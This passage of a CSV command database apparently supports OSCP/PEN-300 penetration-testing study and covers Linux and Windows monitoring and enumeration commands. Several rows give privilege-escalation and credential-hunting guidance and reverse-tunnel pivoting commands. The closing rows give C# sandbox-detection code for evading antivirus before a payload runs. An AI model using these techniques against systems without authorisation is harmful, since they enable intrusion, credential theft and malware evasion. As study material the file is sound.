2-5 seconds depending on log size.","high","","","","","{""-i"": ""Case insensitive"", ""\""sudo.*COMMAND\"""": ""Pattern matches sudo entries with COMMAND field""}","[""cat-etc-sudoers"", ""tail-follow-filter""]","[""ps-aux-full"", ""journalctl-service-follow""]","[""sudo-exploit-find"", ""test-sudo-without""]"
"lastb-failed-logins","Failed Login Attempts","monitoring","lastb -a","Display all failed login attempts from btmp log (bad login tracking)","log-monitoring","","Reads /var/log/btmp (bad login log).

MUST run as root.

OSCP defense tip:
Multiple failures = brute force.

Look for:
(1) Same IP, multiple users (enumeration), (2) Same user, many attempts (password guessing), (3) Many IPs, same user (distributed attack).

Time estimate:
1-5 seconds depending on attack history.","high","","","","","{""-a"": ""Display hostname in last column""}","","[""grep-auth-failed""]",""
"journalctl-boot-messages","View Boot Messages","monitoring","journalctl -b","Display all journal entries from current boot","log-monitoring","","Shows everything from current boot:
kernel, systemd, services.

Previous boot:
-b -1, boot before that:
-b -2, etc.

List boots:
journalctl --list-boots.

Time estimate:
2-10 seconds depending on boot log size.","low","","","","","{""-b"": ""Boot - show messages from current boot only (no previous boot messages)""}","","[""dmesg-kernel-messages""]",""
"systemctl-list","List Systemd Services","monitoring","systemctl list-units --type=service --state=<STATE>","List systemd services filtered by state. Essential for discovering running services, identifying attack surface, and finding privilege escalation vectors through writable service files.","linux-process-monitoring","systemctl list-units --type=service --state=running","**OSCP METHODOLOGY - Service Enumeration for PrivEsc:**

**1. WHY This Command (OSCP Context):**
Systemd services often run as root and are prime targets for privilege escalation. Writable service files, exploitable binaries, or PATH hijacking in service ExecStart directives can lead to root shells. This command is the first step in service-based privilege escalation methodology.

**2. MANUAL ALTERNATIVES (No Tool Available):**
- SysVinit systems: `ls -la /etc/init.d/` and `service --status-all`
- Read systemd unit files directly: `ls -la /etc/systemd/system/*.service`
- Check service status: `ps aux | grep <service_name>`
- Alternative init systems: `chkconfig --list` (RHEL/CentOS), `update-rc.d` (Debian)

**3. OSCP WORKFLOW (Typical Usage):**
```bash
# Step 1: List all running services
systemctl list-units --type=service --state=running --no-pager

# Step 2: List failed services (often reveal misconfigurations)
systemctl list-units --type=service --state=failed --no-pager

# Step 3: Get detailed service info
systemctl status <service_name>

# Step 4: Check service file permissions
systemctl show <service_name> -p FragmentPath --no-pager
ls -la $(systemctl show <service_name> -p FragmentPath --no-pager | cut -d= -f2)

# Step 5: Read service configuration for ExecStart path
systemctl cat <service_name>

# Step 6: Check if ExecStart binary is writable
ls -la /path/to/binary
```

**4. PRIVILEGE ESCALATION VECTORS:**
- **Writable Service Files**: If you can write to /etc/systemd/system/<service>.service, modify ExecStart to run your payload as root
- **Writable ExecStart Binary**: If the binary in ExecStart is writable, replace it with malicious code
- **PATH Hijacking**: If ExecStart uses relative paths, exploit PATH variable to run your binary first
- **Failed Services**: Services in failed state often reveal permission issues or missing dependencies you can exploit
- **Timer Units**: Check for .timer units that run services - these might run as root on schedule

**5. TIME ESTIMATES (OSCP Exam):**
- Initial enumeration: 2-5 minutes
- Analyzing each interesting service: 3-5 minutes per service
- Testing writable service files: 5-10 minutes
- Full service-based privesc attempt: 15-30 minutes total

**6. COMMON PITFALLS:**
- Don't just list services - analyze each one. Check permissions, ExecStart binaries, and configuration files.
- Failed services are gold - they often reveal misconfigurations you can exploit.
- Always check service file permissions: `ls -la /etc/systemd/system/` and `/lib/systemd/system/`
- Don't forget timer units: `systemctl list-timers --all` shows scheduled tasks

**7. WHAT TO LOOK FOR (OSCP Success Indicators):**
- Services running as root with writable configuration files
- ExecStart directives with writable binaries or relative paths
- Services in failed state with permission denied errors
- Custom services in /etc/systemd/system/ (more likely to have misconfigurations)
- Services with EnvironmentFile directives pointing to writable files

**8. ALTERNATIVE COMMANDS (Same Goal):**
- `service --status-all` - SysVinit alternative, shows all services
- `chkconfig --list` - RHEL/CentOS service listing
- `ps aux | grep <service>` - Manual process verification
- `ls /etc/systemd/system/*.service` - Direct file listing
- `find / -name '*.service' -type f 2>/dev/null` - Find all service files

**9. INTEGRATION WITH OTHER ENUM:**
Combine with:
- `linpeas.sh` or `linenum.sh` - Automated privilege escalation enumeration
- `find / -writable -type f 2>/dev/null` - Find all writable files
- `getcap -r / 2>/dev/null` - Check for capabilities
- `sudo -l` - Check sudo permissions

**CRITICAL OSCP TIP**: Don't just run this command and move on. For EACH running service, check: (1) Service file permissions, (2) ExecStart binary permissions, (3) EnvironmentFile permissions, (4) User/Group the service runs as. One writable file = root shell.","high","","","","{""No services listed"": ""Verify systemd is the init system with 'ps -p 1'. Some systems use SysVinit (check /etc/init.d/). Use 'service --status-all' as alternative on SysVinit systems."", ""Permission denied errors"": ""systemctl list-units should work for all users. If denied, system may have custom security module (AppArmor/SELinux). Try 'systemctl list-units --user' to list user services."", ""Failed to connect to bus"": ""System not using systemd. Check init system with 'ps -p 1 -o comm='. On SysVinit, use 'chkconfig --list' (RHEL/CentOS) or 'service --status-all' (Debian/Ubuntu)."", ""Output truncated or using pager"": ""Add --no-pager flag to prevent paging: 'systemctl list-units --type=service --no-pager'. Essential when piping to grep or redirecting to file.""}","{""--type=service"": ""Filter to show only service units (not timers, sockets, etc). Critical for focusing on exploitable services. In OSCP, service units often run as root and may have writable configuration files or exploitable binaries."", ""--state=<STATE>"": ""Filter by service state (running/failed/active/inactive/all). Use 'running' to find active attack surface. Use 'failed' to identify misconfigured services that might reveal privilege escalation paths. Use 'all' for comprehensive enumeration."", ""--all"": ""Show all units regardless of state. Reveals disabled services that might be exploitable if you can enable them. More verbose than --state=all."", ""--no-pager"": ""Output results directly to terminal without using the pager (less). Essential when output is being piped to grep or redirected to a file. Always use in automated scripts."", ""--failed"": ""Shortcut for --state=failed. Quick way to identify broken services that might reveal misconfigurations or permission issues exploitable for privilege escalation.""}","","[""service-status-all-sysv""]","[""systemctl-running-services"", ""linux-writable-services""]"
"lsof-list","List Open Files and Network Connections","monitoring","lsof -i <PROTOCOL>:<PORT> -n -P","List open files, network connections, and file descriptors. Critical for discovering internal services, active connections, unix sockets, and file locks that reveal privilege escalation vectors or lateral movement opportunities.","linux-process-monitoring","lsof -i TCP:8080 -n -P","**OSCP METHODOLOGY - Internal Service Discovery:**

**1. WHY This Command (OSCP Context):**
lsof is critical for post-exploitation enumeration. It reveals services bound to localhost (127.0.0.1) that aren't visible from external nmap scans. These internal services often lack authentication, have weaker security, and provide direct privilege escalation or lateral movement paths. Many OSCP boxes have MySQL, Redis, or web services on localhost with no credentials required.

**2. MANUAL ALTERNATIVES (No lsof Available):**
```bash
# Method 1: Check /proc filesystem
ls -la /proc/*/fd/ | grep socket
for pid in /proc/[0-9]*; do ls -la $pid/fd/ 2>/dev/null | grep socket; done

# Method 2: netstat (usually available)
netstat -tulpn  # TCP/UDP listening ports
netstat -anp    # All network connections

# Method 3: ss (modern netstat replacement)
ss -tulpn       # TCP/UDP listening ports
ss -anp         # All connections

# Method 4: Read /proc/net directly
cat /proc/net/tcp    # Active TCP connections (hex format)
cat /proc/net/udp    # Active UDP connections
cat /proc/net/unix   # Unix domain sockets

# Method 5: Check specific ports
cat /proc/net/tcp | awk '{print $2}' | cut -d: -f2 | sort -u | while read port; do echo ""Port: $((16#$port))""; done
```

**3. OSCP WORKFLOW (Typical Usage):**
```bash
# Step 1: Discover all listening services (internal + external)
lsof -i -n -P | grep LISTEN

# Step 2: Focus on localhost-only services (127.0.0.1)
lsof -i -n -P | grep ""127.0.0.1.*LISTEN""

# Step 3: Check specific interesting ports
lsof -i :3306 -n -P  # MySQL
lsof -i :6379 -n -P  # Redis
lsof -i :8080 -n -P  # HTTP alternate
lsof -i :5432 -n -P  # PostgreSQL

# Step 4: See what files root has open
lsof -u root | head -50

# Step 5: Find Unix domain sockets (local IPC)
lsof -U

# Step 6: Check what processes are using /tmp (privesc vector)
lsof +D /tmp
```

**4. PRIVILEGE ESCALATION VECTORS:**
- **Localhost MySQL/PostgreSQL (no password)**: Connect locally, escalate via UDF, raptor exploit, or file writes
- **Localhost Redis (no auth)**: Use Redis RCE techniques - write SSH keys, cron jobs, or load modules
- **Unix Sockets in /tmp**: If writable, might allow privilege escalation via socket injection
- **Writable files open by root**: If root has files open that you can write to, modify them for code execution
- **Internal web services**: Often lack authentication when bound to 127.0.0.1 - direct access to admin panels

**5. LATERAL MOVEMENT (Port Forwarding):**
Once you discover localhost services, pivot to access them:
```bash
# SSH local port forward (from your kali to target's localhost)
ssh -L 3306:127.0.0.1:3306 user@target

# SSH remote port forward (expose target's localhost to your kali)
ssh -R 8080:127.0.0.1:80 kali@<your_ip>

# Chisel (when SSH not available)
# On kali: ./chisel server -p 8000 --reverse
# On target: ./chisel client <kali_ip>:8000 R:3306:127.0.0.1:3306
```

**6. TIME ESTIMATES (OSCP Exam):**
- Initial lsof enumeration: 2-3 minutes
- Analyzing each internal service: 5-10 minutes per service
- Setting up port forward: 5 minutes
- Exploiting internal service: 10-30 minutes
- Full internal service discovery workflow: 20-40 minutes total

**7. COMMON PITFALLS:**
- Don't skip lsof just because nmap found all ports - localhost services won't show in nmap
- Always use -n and -P flags to prevent DNS/port lookups (faster and stealthier)
- Don't ignore Unix domain sockets (-U flag) - these can be privilege escalation vectors
- Remember to check what files root has open (lsof -u root) - might find writable configs

**8. HIGH-VALUE TARGETS (What to Look For):**
- **MySQL on 127.0.0.1:3306**: Try connecting with no password, check for UDF privilege escalation
- **Redis on 127.0.0.1:6379**: No auth = full control, write SSH keys or cron jobs
- **PostgreSQL on 127.0.0.1:5432**: Similar to MySQL, UDF exploits possible
- **HTTP on 127.0.0.1:8080/8000/3000**: Internal admin panels, often no authentication
- **Elasticsearch on 127.0.0.1:9200**: File write via log injection, code execution
- **Memcached on 127.0.0.1:11211**: Might contain credentials or session tokens
- **Unix sockets in /tmp or /var/run**: IPC mechanisms, sometimes exploitable

**9. ALTERNATIVE COMMANDS (Same Goal):**
- `netstat -tulpn` - Show TCP/UDP listening ports (similar to lsof -i | grep LISTEN)
- `ss -tulpn` - Modern netstat replacement, faster
- `netstat -anp` - Show all network connections with PIDs
- `ss -anp` - Modern alternative to netstat -anp
- `ls -la /proc/*/fd/` - Manual method, check file descriptors in /proc
- `cat /proc/net/tcp` - Raw TCP connection table (hex format)

**10. INTEGRATION WITH OTHER ENUM:**
Combine with:
- `ps aux` - Identify interesting processes, then use lsof -p <pid>
- `netstat -tulpn` - Verify lsof results, cross-reference listening ports
- `linpeas.sh` - Automated enumeration includes lsof output
- `curl http://127.0.0.1:<port>` - Test discovered localhost services
- `mysql -h 127.0.0.1 -u root` - Test localhost MySQL with no password

**CRITICAL OSCP TIP**: Immediately after getting shell access, run 'lsof -i -n -P | grep LISTEN' to discover localhost services. These are GOLD - often no authentication, no firewall, direct root access. A localhost MySQL or Redis with no password is often a direct path to root. Don't skip this step.","high","","","","{""lsof command not found"": ""lsof not installed. MANUAL ALTERNATIVES: (1) Check /proc/<pid>/fd/ to see file descriptors: 'ls -la /proc/*/fd/'. (2) Check listening ports: 'netstat -tulpn' or 'ss -tulpn'. (3) Check network connections: 'netstat -anp' or 'ss -anp'. (4) Install lsof if you have sudo: 'sudo apt install lsof' or 'sudo yum install lsof'."", ""Permission denied on some files"": ""Normal behavior - lsof shows files accessible to your user. Run as root/sudo to see all files: 'sudo lsof'. In OSCP, if you can't sudo, focus on files you CAN see - those might be your privilege escalation vector."", ""Output too verbose"": ""Use filters: (1) Specific port: 'lsof -i :8080 -n -P'. (2) Specific user: 'lsof -u www-data'. (3) Specific process: 'lsof -p 1234'. (4) Network only: 'lsof -i -n -P'. (5) Pipe to grep: 'lsof -n -P | grep LISTEN'."", ""Can't see internal services (127.0.0.1)"": ""From external scan you won't see localhost-bound services. Once you have shell access, run 'lsof -i -n -P' to discover services bound to 127.0.0.1. These are high-value targets - often unfiltered and less hardened."", ""No network connections shown"": ""Verify you're using -i flag: 'lsof -i'. Without -i, lsof shows all open files (verbose). To see only network: 'lsof -i -n -P'. To see only listening: 'lsof -i -n -P | grep LISTEN'.""}","{""-i"": ""List network connections (internet sockets). Without arguments, shows all IPv4/IPv6 connections. With <protocol>:<port>, filters to specific connections. Critical for discovering internal services not visible from nmap external scans (127.0.0.1 bindings)."", ""-i TCP:<port>"": ""Show only TCP connections on specific port. Essential for verifying if a service is listening locally (127.0.0.1) vs externally (0.0.0.0). Local-only services often have weaker security and no firewall protection."", ""-i UDP:<port>"": ""Show only UDP connections on specific port. Useful for discovering DNS servers, SNMP agents, or custom UDP services. UDP services less commonly scanned = more likely to be vulnerable."", ""-n"": ""Disable DNS resolution for hostnames. Shows raw IP addresses instead of hostnames. Essential in OSCP - DNS lookups slow down enumeration and may reveal your presence in logs. Always use -n for speed."", ""-P"": ""Disable port name resolution. Shows raw port numbers (3306) instead of names (mysql). Critical for accurate enumeration - you want exact ports, not service guesses. Always pair with -n."", ""-u <user>"": ""Show only files/connections owned by specific user. Essential for privilege escalation - check what files root has open vs your current user. Files opened by root might be writable by you."", ""-p <pid>"": ""Show only files/connections for specific process ID. Useful when you've identified an interesting process and want to see all its file descriptors, sockets, and connections."", ""-c <command>"": ""Show files/connections for processes matching command name. Example: 'lsof -c apache' shows all files opened by apache processes. Useful for application-specific enumeration."", ""+D <directory>"": ""List all open files under specific directory recursively. Critical for finding which processes are using files in sensitive directories like /tmp or /var. Can reveal lock files or IPC mechanisms."", ""-U"": ""Show Unix domain sockets only. Unix sockets often used for local privilege escalation - processes communicate without network authentication. Look for sockets in /tmp or /var/run you can write to.""}","","[""netstat-listening-tcp"", ""ss-listening-all""]","[""ssh-local-port-forward""]"
"ps-sort-memory","Top Memory Consumers","monitoring","ps aux --sort=-%mem | head -10","List top 10 processes by memory usage (identify memory leaks or suspicious high-memory processes)","resource-monitoring","","OSCP defense tip:
Unexpected high-memory processes may indicate cryptominers, memory scrapers, or DoS attacks.

For top CPU:
ps aux --sort=-%cpu | head -10.

Time estimate:
2 seconds.","medium","","","","","{""aux"": ""All users, user-oriented format, include processes without TTY"", ""--sort=-%mem"": ""Sort by memory percentage descending (highest first, - for descending)"", ""| head -10"": ""Pipe to head to show only first 10 results""}","","",""
"ps-sort-cpu","Top CPU Consumers","monitoring","ps aux --sort=-%cpu | head -10","List top 10 processes by CPU usage (identify CPU-intensive or suspicious processes)","resource-monitoring","","OSCP defense tip:
Unexpected 100% CPU usage may indicate cryptominers, brute-force attacks, or fork bombs.

Time estimate:
2 seconds.","medium","","","","","{""aux"": ""All users, user-oriented format, processes without TTY"", ""--sort=-%cpu"": ""Sort by CPU percentage descending (highest CPU usage first)"", ""| head -10"": ""Show only top 10 results""}","","",""
"free-memory-human","Memory Usage (Human Readable)","monitoring","free -h","Display system memory usage in human-readable format (total, used, free, shared, buff/cache, available)","resource-monitoring","","'available' is key metric - memory available for starting new applications (includes reclaimable cache).

Low available memory = system under pressure.

Swap usage (high) = memory exhaustion.

Time estimate:
<1 second.","medium","","","","","{""-h"": ""Human-readable - display sizes in GB/MB/KB instead of bytes""}","","[""cat-proc-meminfo""]",""
"vmstat-cpu-monitoring","Virtual Memory Statistics","monitoring","vmstat 1 5","Monitor CPU, memory, I/O, and system activity with 5 samples at 1-second intervals","resource-monitoring","","Key columns:
r (processes waiting for CPU), b (blocked on I/O), si/so (swap in/out), us (user CPU%), sy (system CPU%), id (idle CPU%), wa (I/O wait%).

High 'wa' = disk bottleneck.

For continuous:
vmstat 1.

Time estimate:
5 seconds for 5 samples.","low","","","","","{""1"": ""Delay between samples in seconds"", ""5"": ""Number of samples to collect (omit for continuous monitoring)""}","","",""
"iostat-disk-stats","I/O Statistics (Disk Activity)","monitoring","iostat -x 1 5","Monitor disk I/O statistics with extended details (5 samples at 1-second intervals)","resource-monitoring","","Key metrics:
r/s (reads/sec), w/s (writes/sec), %util (disk busy %), await (average I/O wait time in ms).

%util >80% consistently = disk bottleneck.

Time estimate:
5 seconds for 5 samples.

Part of sysstat package.","low","","","","","{""-x"": ""Extended statistics - display detailed per-disk metrics including utilization, await, svctm"", ""1"": ""Interval in seconds between samples"", ""5"": ""Number of samples (omit for continuous)""}","","",""
"uptime-load-average","System Uptime and Load Average","monitoring","uptime","Display system uptime and load averages (1, 5, 15 minute averages)","resource-monitoring","","Load average shows average number of processes in run queue.

On 4-core system:
load of 4.0 = 100% CPU utilization, 8.0 = 200% (overloaded).

Three numbers:
1-min, 5-min, 15-min averages.

Time estimate:
<1 second.","low","","","","","","","[""cat-proc-loadavg""]",""
"df-disk-usage","Disk Space Usage","monitoring","df -h","Display disk space usage for all filesystems in human-readable format","resource-monitoring","","OSCP tip:
Full disk can prevent logging, break services, and stop reverse shells.

Check Use% column.

For specific directory:
df -h /var.

Time estimate:
1 second.","medium","","","","","{""-h"": ""Human-readable - show sizes in GB/MB/KB instead of blocks""}","","",""
"du-directory-usage","Directory Disk Usage","monitoring","du -sh <DIRECTORY>","Show total disk usage for a directory in human-readable format","resource-monitoring","du -sh /var/log","Useful for finding what's consuming disk space.

To see subdirectories:
du -h <DIR> --max-depth=1 | sort -hr.

Time estimate:
1-10 seconds depending on directory size.","medium","","","","","{""-s"": ""Summarize - display only total for directory (not each subdirectory)"", ""-h"": ""Human-readable - show size in GB/MB/KB""}","","",""
"lsof-user-files","Files Opened by User","monitoring","lsof -u <USERNAME>","List all files opened by a specific user (file handles, network connections, devices)","resource-monitoring","lsof -u www-data","Shows everything a user has open:
regular files, directories, network sockets, devices.

Useful for investigating compromised accounts.

Time estimate:
2-5 seconds.","medium","","","","","{""-u"": ""User - list files opened by specific user""}","","",""
"lsof-directory-usage","Processes Using Directory","monitoring","lsof +D <DIRECTORY>","Find all processes that have files open within a directory (recursively)","resource-monitoring","lsof +D /var/www","Useful before unmounting filesystems or deleting directories.

+D is recursive (slow), +d is non-recursive (fast).

Time estimate:
5-30 seconds depending on directory size.","medium","","","","","{""+D"": ""Directory - recursively search directory for open files (slower than +d which is non-recursive)""}","","[""fuser-directory-processes""]",""
"fuser-directory-processes","Processes Using Directory (fuser)","monitoring","fuser -v <DIRECTORY>","Identify processes using files or directories (lighter than lsof)","resource-monitoring","fuser -v /mnt/share","Lighter weight than lsof.

Useful before unmounting.

ACCESS types:
c (current directory), e (executable), f (open file), r (root directory).

Time estimate:
1 second.","low","","","","","{""-v"": ""Verbose - display USER, PID, ACCESS, COMMAND""}","","[""lsof-directory-usage""]",""
"w-user-activity","User Activity (Who is Logged In)","monitoring","w","Show who is logged in and what they are doing, plus system load","resource-monitoring","","CRITICAL for defense monitoring.

Shows active users, their terminal, source IP (FROM), login time, idle time, and current command.

OSCP tip:
Check FROM column for unexpected IPs, WHAT column for suspicious commands (shells, persistence scripts).

Time estimate:
<1 second.","medium","","","","","","","",""
"who-logged-in","Who is Logged In (Detailed)","monitoring","who -a","Display all information about logged-in users including login time and source","resource-monitoring","","More detailed than 'users' command but less info than 'w'.

Shows boot time, runlevel, login processes.

Time estimate:
<1 second.","low","","","","","{""-a"": ""All - display all information (equivalent to -b -d --login -p -r -t -T -u)""}","","[""w-user-activity""]",""
"last-login-history","Login History","monitoring","last -a","Display login history from wtmp log (who logged in, when, from where, how long)","resource-monitoring","","Reads /var/log/wtmp.

OSCP defense tip:
Look for (1) Logins from unexpected IPs, (2) Short-lived sessions (in/out quickly = potential intrusion), (3) Logins at unusual hours.

For specific user:
last -a <USERNAME>.

Time estimate:
1-3 seconds.","medium","","","","","{""-a"": ""Display hostname in last column""}","","",""
"lastlog-user-last","Last Login for All Users","monitoring","lastlog","Display last login time for all users on the system","resource-monitoring","","Shows one entry per user (most recent login).

Reads /var/log/lastlog.

'**Never logged in**' is normal for service accounts.

Time estimate:
1 second.","low","","","","","","","[""last-login-history""]",""
"ps-aux-full","Full Process Snapshot","monitoring","ps aux","Display all running processes with user, PID, CPU, memory, and command details","process-enumeration","","OSCP Tip:
Look for (1) processes running as root from writable directories (/tmp, /var/tmp), (2) custom services that might have misconfigurations, (3) database processes (mysql, postgresql) for credential hunting.

Common manual alternative:
cat /proc/*/cmdline (view process command lines directly from /proc filesystem).

Time estimate:
5 seconds.","high","","","","","{""a"": ""Show processes for all users (not just current user)"", ""u"": ""User-oriented format - displays username, CPU%, MEM%, VSZ, RSS, TTY, STAT, START, TIME, COMMAND"", ""x"": ""Include processes without controlling terminal (daemons, background services)""}","","[""ps-ef-full"", ""top-snapshot"", ""pstree-hierarchy""]","[""ps-auxww-no-truncate"", ""pgrep-pattern-search"", ""netstat-listening-tcp"", ""ss-listening-all"", ""suid-find"", ""linpeas-run""]"
"ps-auxww-no-truncate","Full Process Snapshot (No Truncation)","monitoring","ps auxww","Display all processes with full command lines (no truncation) - critical for finding hidden arguments","process-enumeration","","CRITICAL for OSCP:
Passwords often passed as command-line arguments (mysql -u root -pPASSWORD, ssh user@host -i /path/key).

The 'ww' flag prevents truncation that would hide these.

Manual alternative:
for pid in /proc/[0-9]*; do cat $pid/cmdline 2>/dev/null | tr '\0' ' '; echo; done.

Time estimate:
5 seconds.","high","","","","","{""a"": ""Show processes for all users"", ""u"": ""User-oriented format with detailed columns"", ""x"": ""Include processes without controlling terminal"", ""ww"": ""Wide output - disables column width limit, shows full command line (default is 80 chars)""}","","[""ps-ef-full""]",""
"ps-ef-full","Process List with Parent PIDs","monitoring","ps -ef","Alternative process format showing parent PID (PPID) for process hierarchy analysis","process-enumeration","","PPID (Parent Process ID) helps identify how processes were spawned.

For example, PPID=1 means process was started by init/systemd (system service), while other PPIDs might indicate user-spawned or malicious processes.

Time estimate:
5 seconds.","medium","","","","","{""-e"": ""Select all processes (equivalent to -A)"", ""-f"": ""Full format listing - shows UID, PID, PPID, C (CPU utilization), STIME (start time), TTY, TIME, CMD""}","","[""ps-aux-full"", ""pstree-hierarchy""]",""
"pstree-hierarchy","Process Tree with PIDs","monitoring","pstree -p","Display process hierarchy as tree structure with PIDs - visualize parent-child relationships","process-enumeration","","Excellent for spotting reverse shells or unauthorized processes.

For example, www-data -> bash -> nc indicates a web shell spawned netcat.

Manual alternative:
ps auxf (forest mode shows hierarchy with ASCII art).

Time estimate:
5 seconds.","medium","","","","","{""-p"": ""Show PIDs in parentheses after process names""}","","[""ps-ef-full""]",""
"top-snapshot","Top Processes (Snapshot)","monitoring","top -n 1 -b","Non-interactive top snapshot - capture current top CPU/memory consumers for documentation","process-enumeration","","Batch mode (-b) makes output suitable for documentation or log files.

Without -b, top is interactive and not useful in scripts.

For real-time monitoring, omit these flags and use:
top.

Time estimate:
5 seconds.","medium","","","","","{""-n"": ""Number of iterations before exiting (1 = single snapshot)"", ""-b"": ""Batch mode - non-interactive output suitable for piping or logging""}","","[""ps-sort-cpu""]",""
"pgrep-pattern-search","Find Processes by Name Pattern","monitoring","pgrep -af <PATTERN>","Search for running processes matching a pattern with full command line display","process-enumeration","pgrep -af apache|nginx|mysql","Much faster than 'ps aux | grep' and doesn't show the grep process itself.

Use -i for case-insensitive:
pgrep -afi <PATTERN>.

Time estimate:
1 second.

OSCP tip:
Search for common services:
pgrep -af 'mysql|postgresql|apache|nginx|ssh|vsftpd' to identify attack vectors.","high","","","","","{""-a"": ""List full command line (not just process name)"", ""-f"": ""Match against full command line (not just process name)""}","","","[""lsof-list"", ""ps-pid-details""]"
"pidof-exact","Get PID by Exact Name","monitoring","pidof <PROCESS_NAME>","Quickly get PID(s) of processes by exact name match","process-enumeration","pidof apache2","Returns ALL PIDs if multiple instances running.

For single PID:
pidof <NAME> | head -1.

Time estimate:
<1 second.","medium","","","","","","","",""
"ps-user-filter","Processes by User","monitoring","ps -u <USERNAME>","List all processes running as a specific user","process-enumeration","ps -u www-data","OSCP tip:
Check www-data processes for web vulnerabilities, mysql processes for database attack vectors, root processes for privilege escalation opportunities.

Time estimate:
2 seconds.","high","","","","","{""-u"": ""Select by effective user ID or name""}","","[""ps-aux-full"", ""ps-user-filter""]","[""pspy-monitor""]"
"ps-pid-details","Get Full Command for PID","monitoring","ps -p <PID> -o cmd=","Display full command line for a specific PID without header (clean output)","process-enumeration","ps -p 1234 -o cmd=","The '=' after 'cmd' removes the header for cleaner parsing in scripts.

For multiple fields:
ps -p <PID> -o pid=,cmd=,user=.

Time estimate:
<1 second.","medium","","","","","{""-p"": ""Select by process ID"", ""-o"": ""User-defined output format"", ""cmd="": ""Show full command line, no header (= suppresses column header)""}","","",""
"win-tasklist-verbose","Windows Task List (Verbose)","monitoring","tasklist /v","Display all Windows processes with verbose details including window titles and memory usage","process-enumeration","","Window titles often reveal sensitive information (open files, database connections).

OSCP tip:
Look for (1) processes running from unusual locations (\Temp, \Users\Public), (2) processes with high privileges (SYSTEM), (3) non-standard services.

Time estimate:
5 seconds.","high","","","","","{""/v"": ""Verbose - displays additional information including status, username, CPU time, window title""}","","[""win-wmic-process-full"", ""win-ps-get-process""]",""
"win-tasklist-services","Windows Task List with Services","monitoring","tasklist /svc","Display which Windows services are running in each process (svchost.exe mapping)","process-enumeration","","Critical for Windows privilege escalation.

svchost.exe hosts multiple services - this command reveals which ones.

Time estimate:
5 seconds.

OSCP tip:
Combine with service configuration checks to find writable service binaries or unquoted service paths.","high","","","","","{""/svc"": ""Services - displays services hosted in each process (critical for identifying svchost.exe instances)""}","","[""win-wmic-service-full"", ""win-ps-get-service""]",""
"win-wmic-process-full","Windows WMIC Process Details","monitoring","wmic process list full","Comprehensive Windows process information including full paths, command lines, and parent PIDs","process-enumeration","","WMIC deprecated in Windows 11+ but still present in OSCP target systems.

Output is verbose (30+ properties per process).

For specific fields:
wmic process get ProcessId,Name,ExecutablePath,CommandLine.

Time estimate:
10 seconds.

OSCP tip:
CommandLine often contains credentials passed as arguments.","high","","","","","{""process"": ""Query Win32_Process WMI class"", ""list"": ""List instances"", ""full"": ""Display all available properties (30+ fields including ExecutablePath, CommandLine, ParentProcessId)""}","","[""win-ps-get-process-detailed"", ""win-tasklist-verbose""]",""
"win-ps-get-process","PowerShell Get Process","monitoring","Get-Process | Select-Object Name,Id,Path,Company","PowerShell process enumeration with selected properties (Name, PID, Path, Company)","process-enumeration","","PowerShell is the modern Windows process management tool.

Company field helps identify third-party software (potential attack vectors).

For all properties:
Get-Process | Select-Object *.

Time estimate:
5 seconds.

OSCP tip:
Non-Microsoft processes often have weak permissions or outdated versions with known exploits.","high","","","","","{""Get-Process"": ""Retrieves process objects for all running processes"", ""Select-Object"": ""Filters output to specified properties"", ""Name"": ""Process executable name"", ""Id"": ""Process ID (PID)"", ""Path"": ""Full path to executable (helps identify location)"", ""Company"": ""Company that created the executable (identifies non-Microsoft processes)""}","","[""win-tasklist-verbose"", ""win-wmic-process-full""]",""
"win-ps-get-process-detailed","PowerShell Get Process (Full Details)","monitoring","Get-WmiObject win32_process | Select-Object Name,ProcessId,ExecutablePath,CommandLine","PowerShell WMI process query with command-line arguments (reveals passwords, tokens)","process-enumeration","","CRITICAL for credential discovery.

CommandLine field shows full arguments including passwords, API keys, database strings.

Time estimate:
10 seconds.

OSCP tip:
Common patterns to grep:
'-p ', 'password=', 'token=', 'key=', 'api_key='.

Modern alternative:
Get-CimInstance win32_process (replaces Get-WmiObject in PowerShell 3.0+).","high","","","","","{""Get-WmiObject"": ""Query WMI (Windows Management Instrumentation) objects"", ""win32_process"": ""WMI class for process information"", ""ExecutablePath"": ""Full path to executable"", ""CommandLine"": ""Full command line including all arguments (critical for credential hunting)""}","","[""win-wmic-process-full""]",""
"sleep-timer-validation","Sleep Timer with Validation","heuristic-evasion","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(<SLEEP_MS>);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < <THRESHOLD_SEC>) {
    return; // Sandbox detected
}
// Continue execution","Detect sandbox by measuring actual elapsed time vs requested sleep duration. Sandboxes skip Sleep() calls to speed up analysis - detect by checking if sufficient time actually passed.","","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(10000);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < 9.5) {
    return; // Sandbox detected
}
// Continue execution","Syntax:
Add to C# Main() before payload execution Simple but effective against basic sandboxes.

10 seconds standard.

Combine with other checks for best results.

See also:
csharp-sleep-timer in shellcode-runners.

Time estimate:
1 minute (integration) References:
docs/av-evasion/heuristic-evasion.md#sleep-timer, shellcode-runners.json#csharp-sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:
Use GetTickCount() before/after sleep, or QueryPerformanceCounter for high-resolution timing","","","","","","","","",""
"non-emulated-api-numa","Non-Emulated API (VirtualAllocExNuma)","heuristic-evasion","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == IntPtr.Zero) {
    return; // Sandbox detected
}","Detect sandbox/emulation by calling VirtualAllocExNuma - rarely emulated API. If returns NULL, indicates emulated environment. NUMA APIs require actual hardware support.","","","Syntax:
Add to C# Main() before payload execution More sophisticated than sleep timer.

Bypasses time-aware sandboxes.

Quick to implement.

See also:
csharp-non-emulated-api in shellcode-runners.

Time estimate:
2 minutes (integration) References:
docs/av-evasion/heuristic-evasion.md#non-emulated-apis, shellcode-runners.json#csharp-non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:
Use FlsAlloc, GetTickCount64, or other non-emulated APIs.

Check for debugger with IsDebuggerPresent.","","","","","","","","",""
"large-memory-allocation","Large Memory Allocation Check","heuristic-evasion","using System;

IntPtr mem = IntPtr.Zero;
try {
